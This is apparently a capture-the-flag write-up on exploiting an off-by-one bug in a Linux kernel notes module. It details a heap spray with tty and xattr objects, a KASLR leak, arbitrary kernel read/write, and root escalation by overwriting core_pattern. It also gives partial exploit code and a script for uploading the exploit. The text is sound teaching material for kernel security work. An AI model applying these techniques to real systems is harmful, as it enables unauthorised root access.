### FUNCTIONALITY

This kernel module implements a storage system for notes, it manages a dynamically sized array (referred to as the banks) of data objects. Each object is defined by a fatptr struct, which simply holds a pointer to the allocated data and the size of that allocation, we can create notes with ioctl_create() by specifying a requested size, the kernel module allocates a new data buffer of that size on the heap using kmalloc. It then extends the banks array using krealloc to store the new object's pointer and size, and increments the total count of stored items

```
struct fatptr {
	void *data;
	size_t size;
};

static long ioctl_create(const struct args_create __user *ptr)
{
	struct args_create args;
	void *data;

	if(copy_from_user(&args, ptr, sizeof(args)))
		return -EFAULT;

	// Allocate a new buffer
	data = kmalloc(args.size, GFP_KERNEL);
	if(NULL == data)
		return -ENOMEM;

	// Push the new object
	mutex_lock(&lock);
	banks = krealloc(banks, sizeof(*banks) * (count + 1), GFP_KERNEL);
	banks[count] = (struct fatptr){
		.data = data,
		.size = args.size,
	};
	mutex_unlock(&lock);

	return count++;
}

static long ioctl_switch(const struct args_switch __user *ptr)
{
	struct args_switch args;

	if(copy_from_user(&args, ptr, sizeof(args)))
		return -EFAULT;

	if(args.index > count)
		return -EINVAL;

	index = args.index;
	return index;
}

```

Because only 1 note can be processed at a time we use ioctl_switch() to change the current proccesed note by supplying an index

We use mod_write() to write data directly into the heap buffer of the currently selected note, utilizing copy_from_user(), we use mod_read() to read data from the currently selected note's buffer back into user space, using copy_to_user()

```
static ssize_t mod_write(struct file *file, const char __user *out, size_t size, loff_t *off)
{
	void *data;
	size_t len;

	int r = getData(&data, &len, *off, size);
	if(0 != r)
		return r;

	if(copy_from_user(data, out, len))
		return -EFAULT;

	return len;
}

static ssize_t mod_read(struct file *file, char __user *out, size_t size, loff_t *off)
{
	void *data;
	size_t len;

	int r = getData(&data, &len, *off, size);
	if(0 != r)
		return r;

	if(copy_to_user(out, data, len))
		return -EFAULT;

	return len;
}
```

### THE VULNERABILITY

This kernel module maintains an array of fatptr structs which can be dynamically expanded using krealloc() 

In ioctl_switch(), we can select an object to interact with by providing an index, however there is aflawed check:
```
if (args.index > count)
    return -EINVAL;
```

We can supply count as an idx which means we can access an out of bounds index which equals count (off by one error). Since arrays indexes in C are start from 0, selecting the index equal to count allows access to an object exactly one element out of bounds

### EXPLOITATION

To weaponize this vulnerability, we must control what resides right at this count index.

The linux kernel utilizes the SLUB allocator, which groups allocations inside different caches depending on their size (for example, kmalloc-512 for allocations up to 512 bytes, kmalloc-1024 for up to 1024 bytes)

by spraying the heap with objects of our choice we can control what is placed after out controlled object

### KASLR BYPASS

By opening the /dev/ptmx device multiple times, we force the heap to allocate multiple tty related objects in the kmalloc-512 cache. The first two fields of these structures match the layout of the fatptr structure (a pointer followed by a size)

By positioning the banks array immediately before a tty object, we use the off by one vulnerability to read the tty object's data. This leaks kernel function pointers which leads to us defeating kaslr

### GAINING AAW/AAR 

To gain AAR/AAW, we increase the banks array size so is is reallocated in the kmalloc-1024 cache and we spray the cache with fake fatptr objects via xattr, utilizing the off by one vuln, we are able to point the data pointer of the fake object into any address in the kernel space, and by using read and write operations we gain full leverage


### PRIVILEGE ESCALATION (CORE_PATTERN OVERWRITE)

core_pattern is a system kernel parameter that defines the filename pattern and destination for core dump files generated when a process crashes

When a program crashes, a core dump is written to disk to help debug the issue. core_pattern dictates what this file is named and where it is saved

When a bar is the first character in core_pattern its behaviour changes, instead of writing the core dump to a standard file, the kernel executes the program specified after the pipe with absolute root privileges, passing the core dump data to that program's standard input

by overwriting core_pattern with our malicious script '/tmp/x' and triggering a crash we can execute our own script with root privileges 

NOTE 1: after spraying the 1024 cache with xattr objects, the exact layout of the heap is not perfectly predictable. we know that the out-of-bounds index (0x40) overlaps with one of the fake fatptr objects, however the one bank index that overlaps with one of the fake fatptr objects is not 100% reliable, so we write a function that automatically finds that index

NOTE 2: for our ease, we write a python script that automatically compiles and transfers the exploit to the VM and executes it

```python
def compile_exploit():
    print('[+] compiling exploit...')
    cmd = ["musl-gcc", "-static", "-Os", "exploit.c", "-o", "exploit"] 
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print('[+] compilation successful')
    except subprocess.CalledProcessError as e:

def transfer_exploit():
    io.sendlineafter(b'$', b'cd /tmp')
    with open('exploit', 'rb') as f:
        exploit = f.read()
    exploit_b32 = b32encode(exploit).decode()
    progress = 0
    n = 0x300

    print(f'[+] sending exploit (total: {hex(len(exploit_b32))} bytes)...')
    for s in [exploit_b32[i: i+n] for i in range(0, len(exploit_b32), n)]:
        io.sendlineafter(b'$', f'echo -n "{s}" >> exploit.b32'.encode())
        progress += len(s)

    print('[+] upload complete')

def run_exploit():
    io.sendlineafter(b'$', b'base32 -d exploit.b32 > exploit')
    io.sendlineafter(b'$', b'chmod +x ./exploit')
```

```
int find_overlapping_idx(int fd, uint64_t kbase) {
    uint64_t test_addr = kbase + INIT_TASK_OFFSET;

    for (int i = 0x20; i < OOB_IDX; i++) {
        struct { void *data; size_t size; } fp = {
            .data = (void *)test_addr,
            .size = 0xffffffffffffffff
        };

        switch_entry(fd, i);
        pwrite(fd, &fp, sizeof(fp), 0);

        switch_entry(fd, OOB_IDX);
        uint64_t val = 0;
        ssize_t n = pread(fd, &val, 8, 0);

        if (n == 8 && val > 0 && val < 0x100000) { 
            uint64_t next = 0;
            struct { void *data; size_t size; } fp2 = {
                .data = (void *)(test_addr + TASK_TASKS_OFFSET),
```
